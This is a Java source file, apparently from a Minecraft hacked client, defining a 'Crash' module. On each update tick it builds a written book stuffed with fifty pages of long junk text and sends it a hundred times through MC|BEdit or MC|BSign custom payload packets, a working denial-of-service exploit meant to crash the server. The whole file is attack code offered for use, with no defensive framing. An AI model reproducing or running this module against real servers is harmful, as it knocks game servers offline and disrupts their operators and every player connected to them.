package volcano.summer.client.modules.misc;

import java.util.Random;

import io.netty.buffer.Unpooled;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import volcano.summer.base.manager.event.Event;
import volcano.summer.base.manager.module.Module;
import volcano.summer.client.events.EventUpdate;
import volcano.summer.client.util.TimerUtil;

public class Crash extends Module {

	public static TimerUtil timer;
	Random rand = new Random();

	public Crash() {
		super("Crash", 0, Category.MISC);
		this.timer = new TimerUtil();
	}

	@Override
	public void onEnable() {
	}

	@Override
	public void onDisable() {
	}

	public void Test() {
		try {
			ItemStack bookObj = new ItemStack(Items.written_book);
			String author = "Volcano" + Math.random() * 400.0D;
			String title = "Memed" + Math.random() * 400.0D;
			String mm255 = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
			NBTTagCompound tag = new NBTTagCompound();
			NBTTagList list = new NBTTagList();
			for (int i = 0; i < 50; i++) {
				String siteContent = mm255;
				NBTTagString tString = new NBTTagString(siteContent);
				list.appendTag(tString);

			}
			tag.setString("author", author);
			tag.setString("title", title);
			tag.setTag("pages", list);
			if (bookObj.hasTagCompound()) {
				NBTTagCompound nbttagcompound = bookObj.getTagCompound();
				nbttagcompound.setTag("pages", list);
			} else {
				bookObj.setTagInfo("pages", list);
			}
			String s2 = "MC|BEdit";
			if (this.rand.nextBoolean()) {
				s2 = "MC|BSign";
			}
			bookObj.setTagCompound(tag);
			PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
			packetbuffer.writeItemStackToBuffer(bookObj);
			mc.thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload(s2, packetbuffer));
		} catch (Exception localException) {
		}
	}

	@Override
	public void onEvent(Event e) {
		if (e instanceof EventUpdate) {
			if (mc.theWorld != null) {
				for (int i = 0; i < 100; i++) {
					Test();
				}
			}
			this.onDisable();
		}
	}
}